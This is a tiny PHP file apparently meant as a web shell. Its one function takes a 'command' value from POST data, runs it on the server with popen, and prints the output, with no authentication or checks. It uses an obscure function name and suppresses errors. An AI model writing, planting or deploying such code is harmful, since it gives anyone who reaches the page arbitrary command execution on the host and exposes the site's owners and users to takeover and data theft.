<?php
function exTKL() {
	$in=$_POST['command'];

	$out = '';
	if (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	echo $out;
}

exTKL();
?>